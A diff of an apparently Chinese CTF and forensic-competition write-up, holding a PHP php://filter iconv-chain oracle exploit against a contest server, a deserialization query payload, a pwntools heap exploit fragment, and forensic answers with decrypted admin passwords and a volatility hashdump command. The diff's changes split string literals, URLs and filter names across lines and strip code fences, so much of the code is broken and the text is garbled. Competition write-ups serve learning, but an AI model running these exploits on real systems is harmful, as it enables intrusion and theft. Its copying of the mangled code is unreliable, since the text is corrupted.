@@ -83,7 +83,8 @@ def req(s):
   'my[secret.flag':'C:8:"Saferman":0:{}',
   'secret': f'php://filter/{s}/resource=/flag'
  }
- return requests.get('http://123.57.73.24:43180/index.php', params=data).status_code == 500
+ return requests.get('http://123.57.73.24:
+43180/index.php', params=data).status_code == 500
 
 """
 Step 1:
@@ -158,7 +159,8 @@ there are filters that *swap* characters:
 convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
 abcdefgh -> badcfehg
 
-convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
+convert.iconv.UCS-4LE.10646-1:
+1993, which I call r4, reverses every chunk of four characters:
 abcdefgh -> dcbahgfe
 
 This allows us to access the first four characters of the string. Can we do better? It turns out
@@ -211,9 +213,11 @@ the string still has two equals signs in it, so we can reapply the�
 want, to access all the characters in the string ;)
 """
 
-flip = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"
+flip = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:
+1993|convert.base64-decode|convert.base64-encode"
 r2 = "convert.iconv.CSUNICODE.UCS-2BE"
-r4 = "convert.iconv.UCS-4LE.10646-1:1993"
+r4 = "convert.iconv.UCS-4LE.10646-1:
+1993"
 
 def get_nth(n):
  global flip, r2, r4
@@ -502,29 +506,35 @@ p.close()
 
 APK取证
 
-01.【APK取证】涉案apk的包名是？[答题格式:com.baid.ccs]
+01.【APK取证】涉案apk的包名是？[答题格式:
+com.baid.ccs]
 
 com.vestas.app
 
-02.【APK取证】涉案apk的签名序列号是？[答题格式:0x93829bd]
+02.【APK取证】涉案apk的签名序列号是？[答题格式:
+0x93829bd]
 
 0x563b45ca
 
-03.【APK取证】涉案apk中DCLOUD_AD_ID的值是？[答题格式:2354642]
+03.【APK取证】涉案apk中DCLOUD_AD_ID的值是？[答题格式:
+2354642]
 
 2147483647
 
-04.【APK取证】涉案apk的服务器域名是？[答题格式:http://sles.vips.com]
+04.【APK取证】涉案apk的服务器域名是？[答题格式:
+http://sles.vips.com]
 
 https://vip.licai.com
 
-05.【APK取证】涉案apk的主入口是？[答题格式:com.bai.cc.initactivity]
+05.【APK取证】涉案apk的主入口是？[答题格式:
+com.bai.cc.initactivity]
 
 io.dcloud.PandoraEntry
 
 手机取证
 
-06.【手机取证】该镜像是用的什么模拟器？[答题格式:天天模拟器]
+06.【手机取证】该镜像是用的什么模拟器？[答题格式:
+天天模拟器]
 
 名字就叫leidian，所以是雷电模拟器
 
@@ -534,7 +544,8 @@ io.dcloud.PandoraEntry
 
 与你
 
-08.【手机取证】聊天软件的包名是？[答题格式:com.baidu.ces]
+08.【手机取证】聊天软件的包名是？[答题格式:
+com.baidu.ces]
 
 09.【手机取证】投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]
 
@@ -678,22 +689,27 @@ vim /www/wwwroot/v9.licai.com/app/Http/Controllers/Admin/LoginController.php
 
  public function index(Request $request)
     {
-        // echo Crypt::encrypt('123456');
-        // echo Crypt::decrypt("eyJpdiI6IjVJK3U1bERBSnhqdUZTcDNyVHBFREE9PSIsInZhbHVlIjoiSWpMdGtOQTlkVTFlVU83aHR3RFJ3UlU2K09lRjBuSzdSSlwvY0FLTTBXY009IiwibWFjIjoiZGY4MWNkYWY3Njc2ODRmODg0YjMxMWM1NmViNDAxZjA4ZDI0YTUwNGZhZmFjNjk0ZDZkMzQzZDA2NGI5ZDdmMSJ9");
-        echo Crypt::decrypt("eyJpdiI6IjNHMDJWZkpwMnBXVUpsYjRKcEM4WlE9PSIsInZhbHVlIjoibEpXSkJZZFlpWkl2dU9kY2tvR2xMWnZxT3E5T1pRUnhDVFlidjczY01EMD0iLCJtYWMiOiI5ODA2Nzc5MjM0MDE4MGY0MTkxMGEyOGQ1MTUwNWZiYmViMzk0MmQxYzc3NmViOWE5YTZjMjljNWM5OGIxZWVkIn0=");
+        // echo Crypt::
+encrypt('123456');
+        // echo Crypt::
+decrypt("eyJpdiI6IjVJK3U1bERBSnhqdUZTcDNyVHBFREE9PSIsInZhbHVlIjoiSWpMdGtOQTlkVTFlVU83aHR3RFJ3UlU2K09lRjBuSzdSSlwvY0FLTTBXY009IiwibWFjIjoiZGY4MWNkYWY3Njc2ODRmODg0YjMxMWM1NmViNDAxZjA4ZDI0YTUwNGZhZmFjNjk0ZDZkMzQzZDA2NGI5ZDdmMSJ9");
+        echo Crypt::
+decrypt("eyJpdiI6IjNHMDJWZkpwMnBXVUpsYjRKcEM4WlE9PSIsInZhbHVlIjoibEpXSkJZZFlpWkl2dU9kY2tvR2xMWnZxT3E5T1pRUnhDVFlidjczY01EMD0iLCJtYWMiOiI5ODA2Nzc5MjM0MDE4MGY0MTkxMGEyOGQ1MTUwNWZiYmViMzk0MmQxYzc3NmViOWE5YTZjMjljNWM5OGIxZWVkIn0=");
         ......
 
 解得
 admin/root123456
 root/mzx10000s
 
-访问http://vip.licai.com:8083/AdminV9YY/Login。后台地址可以通过/www/wwwlogs/v9.licai.com.log日志查看
+访问http://vip.licai.com:
+8083/AdminV9YY/Login。后台地址可以通过/www/wwwlogs/v9.licai.com.log日志查看
 
 登录后台后,会员管理->会员管理。案件介绍中嫌疑人为杨某，直接搜索名字杨。发现只有杨德忠具有推广人数
 
 69
 
-34.【服务器取证】请给出涉案网站后台启用的超级管理员?[答题格式:abc]
+34.【服务器取证】请给出涉案网站后台启用的超级管理员?[答题格式:
+abc]
 
 管理账号->
 
@@ -707,7 +723,8 @@ admin
 
 183.160.76.194
 
-37.【服务器取证】分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:100]
+37.【服务器取证】分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:
+100]
 
 会员管理->团队结算，会员等级筛选得到20个
 
@@ -719,11 +736,13 @@ admin
 
 2
 
-39.【服务器取证】分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:10000.00]
+39.【服务器取证】分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:
+10000.00]
 
 128457.00
 
-40.【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:123]
+40.【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:
+123]
 
 受害人上线 为 杨德忠。下线在代码中通过tuiguangrens字段表示的，在会员管理->团队结算中
 
@@ -802,29 +821,9 @@ if(isset($_GET['my_secret.flag'])){
 }else{
     highlight_file(__FILE__);
 }
-```
-
-
-
-```
 ?my[secret.flag=
-```
-
-
-
-```
 C:8:"Saferman":0:{}
-```
-
-
-
-```
 file($_GET['secret']);
-```
-
-
-
-```
 import requests
 import sys
 from base64 import b64decode
@@ -867,7 +866,8 @@ def req(s):
   'my[secret.flag':'C:8:"Saferman":0:{}',
   'secret': f'php://filter/{s}/resource=/flag'
  }
- return requests.get('http://123.57.73.24:43180/index.php', params=data).status_code == 500
+ return requests.get('http://123.57.73.24:
+43180/index.php', params=data).status_code == 500
 
 """
 Step 1:
@@ -942,7 +942,8 @@ there are filters that *swap* characters:
 convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
 abcdefgh -> badcfehg
 
-convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
+convert.iconv.UCS-4LE.10646-1:
+1993, which I call r4, reverses every chunk of four characters:
 abcdefgh -> dcbahgfe
 
 This allows us to access the first four characters of the string. Can we do better? It turns out
@@ -995,9 +996,11 @@ the string still has two equals signs in it, so we can reapply the�
 want, to access all the characters in the string ;)
 """
 
-flip = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"
+flip = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:
+1993|convert.base64-decode|convert.base64-encode"
 r2 = "convert.iconv.CSUNICODE.UCS-2BE"
-r4 = "convert.iconv.UCS-4LE.10646-1:1993"
+r4 = "convert.iconv.UCS-4LE.10646-1:
+1993"
 
 def get_nth(n):
  global flip, r2, r4
@@ -1233,11 +1236,6 @@ d = b64decode(o.encode() + b'=' * 4)
 # remove KR padding
 d = d.replace(b'$)C',b'')
 print(b64decode(d))
-```
-
-
-
-```
 from pwn import *
 
 context.log_level='debug'
@@ -1281,300 +1279,63 @@ delete(2)
 p.interactive()
 
 p.close()
-```
-
-
-
-```
 com.vestas.app
-```
-
-
-
-```
 0x563b45ca
-```
-
-
-
-```
 2147483647
-```
-
-
-
-```
 https://vip.licai.com
-```
-
-
-
-```
 io.dcloud.PandoraEntry
-```
-
-
-
-```
 雷电模拟器
-```
-
-
-
-```
 与你
-```
-
-
-
-```
 5万
-```
-
-
-
-```
 华哥
-```
-
-
-
-```
 23f861b2e9c5ce9135afc520cbd849677522f54c
-```
-
-
-
-```
 http://global.bing.com/?scope=web&mkt=en-US&FORM=QBRE
-```
-
-
-
-```
 yang88/3w.qax.com
-```
-
-
-
-```
 2023春季更新(14309)
-```
-
-
-
-```
 24cfcfdf1fa894244f904067838e7e01e28ff450
-```
-
-
-
-```
 3w.qax.com!!@@
-```
-
-
-
-```
 3261
-```
-
-
-
-```
 1019
-```
-
-
-
-```
 2023-06-21 01:02:27
-```
-
-
-
-```
 volatility.exe -f .memdump.mem --profile=Win7SP1x64 hashdump
-```
-
-
-
-```
 3w.qax.com
-```
-
-
-
-```
 volatility.exe -f .memdump.mem --profile=Win7SP1x64  printkey -K "ControlSet001EnumUSBSTOR"
-```
-
-
-
-```
 2023-06-21 01:01:25
-```
-
-
-
-```
 aad3b435b51404eeaad3b435b51404ee
-```
-
-
-
-```
 2023-06-21 00:29:16
-```
-
-
-
-```
 volatility.exe -f .memdump.mem --profile=Win7SP1x64 userassist
-```
-
-
-
-```
 2023-06-21 00:47:41
-```
-
-
-
-```
 SELECT url,title,visit_count,datetime((last_visit_time / 1000000) + strftime('%s', '1601-01-01'), 'unixepoch', 'localtime') AS visit_datetime FROM urls;
-```
-
-
-
-```
 2
-```
-
-
-
-```
 volatility.exe -f .memdump.mem --profile=Win7SP1x64 cmdline
-```
-
-
-
-```
 2456
-```
-
-
-
-```
 3.10.0-957.el7.x86_64
-```
-
-
-
-```
 netstat -tlunp # 发现8083端口
-```
-
-
-
-```
 cat /www/wwwroot/v9.licai.com/.env
-```
-
-
-
-```
 ff1d923939ca2dcf
-```
-
-
-
-```
 pc-uf6mmj68r91f78hkj.rwlb.rds.aliyuncs.com
-```
-
-
-
-```
 5.7.40
-```
-
-
-
-```
 public function index(Request $request)
     {
-        // echo Crypt::encrypt('123456');
-        // echo Crypt::decrypt("eyJpdiI6IjVJK3U1bERBSnhqdUZTcDNyVHBFREE9PSIsInZhbHVlIjoiSWpMdGtOQTlkVTFlVU83aHR3RFJ3UlU2K09lRjBuSzdSSlwvY0FLTTBXY009IiwibWFjIjoiZGY4MWNkYWY3Njc2ODRmODg0YjMxMWM1NmViNDAxZjA4ZDI0YTUwNGZhZmFjNjk0ZDZkMzQzZDA2NGI5ZDdmMSJ9");
-        echo Crypt::decrypt("eyJpdiI6IjNHMDJWZkpwMnBXVUpsYjRKcEM4WlE9PSIsInZhbHVlIjoibEpXSkJZZFlpWkl2dU9kY2tvR2xMWnZxT3E5T1pRUnhDVFlidjczY01EMD0iLCJtYWMiOiI5ODA2Nzc5MjM0MDE4MGY0MTkxMGEyOGQ1MTUwNWZiYmViMzk0MmQxYzc3NmViOWE5YTZjMjljNWM5OGIxZWVkIn0=");
+        // echo Crypt::
+encrypt('123456');
+        // echo Crypt::
+decrypt("eyJpdiI6IjVJK3U1bERBSnhqdUZTcDNyVHBFREE9PSIsInZhbHVlIjoiSWpMdGtOQTlkVTFlVU83aHR3RFJ3UlU2K09lRjBuSzdSSlwvY0FLTTBXY009IiwibWFjIjoiZGY4MWNkYWY3Njc2ODRmODg0YjMxMWM1NmViNDAxZjA4ZDI0YTUwNGZhZmFjNjk0ZDZkMzQzZDA2NGI5ZDdmMSJ9");
+        echo Crypt::
+decrypt("eyJpdiI6IjNHMDJWZkpwMnBXVUpsYjRKcEM4WlE9PSIsInZhbHVlIjoibEpXSkJZZFlpWkl2dU9kY2tvR2xMWnZxT3E5T1pRUnhDVFlidjczY01EMD0iLCJtYWMiOiI5ODA2Nzc5MjM0MDE4MGY0MTkxMGEyOGQ1MTUwNWZiYmViMzk0MmQxYzc3NmViOWE5YTZjMjljNWM5OGIxZWVkIn0=");
         ......
-```
-
-
-
-```
 解得
 admin/root123456
 root/mzx10000s
-```
-
-
-
-```
 69
-```
-
-
-
-```
 admin
-```
-
-
-
-```
 183.160.76.194
-```
-
-
-
-```
 20
-```
-
-
-
-```
 2
-```
-
-
-
-```
 128457.00
-```
-
-
-
-```
 vim /www/wwwroot/v9.licai.com/app/Http/Controllers/Admin/SalesmansController.php
-```
-
-
-
-```
 vim /www/wwwroot/v9.licai.com/resources/views/hui/salesmans/lists.blade.php
-```
-
-
-
-```
 17
-```
-
-
-
-```
 rows = document.querySelectorAll("#view tr");
 var count = 0;
 
@@ -1588,17 +1349,7 @@ rows.forEach(function(row) {
     }
  });
 console.log("Count: " + count);
-```
-
-
-
-```
 60
-```
-
-
-
-```
 rows = document.querySelectorAll("#view tr");
 var count = 0;
 var Name = "";
@@ -1614,25 +1365,10 @@ rows.forEach(function(row) {
      }
  });
 console.log("最多代理人姓名: " + Name);
-```
-
-
-
-```
 骆潇原
-```
-
-
-
-```
 select (SELECT sum(moneylog_money)
 FROM `viplicai`.`moneylog` WHERE `viplicai`.`moneylog`.`moneylog_status`='+')-(SELECT sum(moneylog_money)
 FROM `viplicai`.`moneylog` WHERE `viplicai`.`moneylog`.`moneylog_status`='-');
-```
-
-
-
-```
 15,078,796.38
 ```
 
